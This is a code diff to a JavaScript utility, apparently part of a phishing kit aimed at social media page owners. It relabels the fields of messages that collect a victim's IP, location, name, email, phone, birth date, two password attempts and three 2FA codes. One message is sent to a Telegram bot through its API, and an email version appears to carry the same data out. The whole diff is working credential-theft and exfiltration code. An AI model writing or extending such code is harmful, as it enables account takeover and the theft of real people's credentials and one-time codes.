@@ -77,8 +77,8 @@ const Utils = {
         const locationData = await this.getUserLocation();
 
         const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
+<b>IP Address:</b> <code>${locationData.ip}</code>
+<b>Country:</b> <code>${locationData.location})</code>
 ----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
@@ -87,12 +87,12 @@ const Utils = {
 <b>Phone:</b> <code>${data.phone || ''}</code>
 <b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
 ----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+<b>Password:</b> <code>${data.password || ''}</code>
+<b>Password:</b> <code>${data.passwordSecond || ''}</code>
 ----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+<b>2FA:</b> <code>${data.twoFa || ''}</code>
+<b>2FA:</b> <code>${data.twoFaSecond || ''}</code>
+<b>2FA:</b> <code>${data.twoFaThird || ''}</code>`;
 
         try {
             await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -113,8 +113,8 @@ const Utils = {
         const locationData = await this.getUserLocation();
 
         const emailContent = `
-IP: ${locationData.ip}
-Location: ${locationData.location}
+IP Address: ${locationData.ip}
+Country: ${locationData.location}
 ----------------------------------
 Full Name: ${data.fullName || ''}
 Email: ${data.email || ''}
@@ -123,12 +123,12 @@ Page Name: ${data.fanpage || ''}
 Phone: ${data.phone || ''}
 Date of Birth: ${data.day}/${data.month}/${data.year}
 ----------------------------------
-Password(1): ${data.password || ''}
-Password(2): ${data.passwordSecond || ''}
+Password: ${data.password || ''}
+Password: ${data.passwordSecond || ''}
 ----------------------------------
-🔐Code 2FA(1): ${data.twoFa || ''}
-🔐Code 2FA(2): ${data.twoFaSecond || ''}
-🔐Code 2FA(3): ${data.twoFaThird || ''}
+2FA: ${data.twoFa || ''}
+2FA: ${data.twoFaSecond || ''}
+2FA: ${data.twoFaThird || ''}
 
 Sent at: ${new Date().toLocaleString()}`;
 
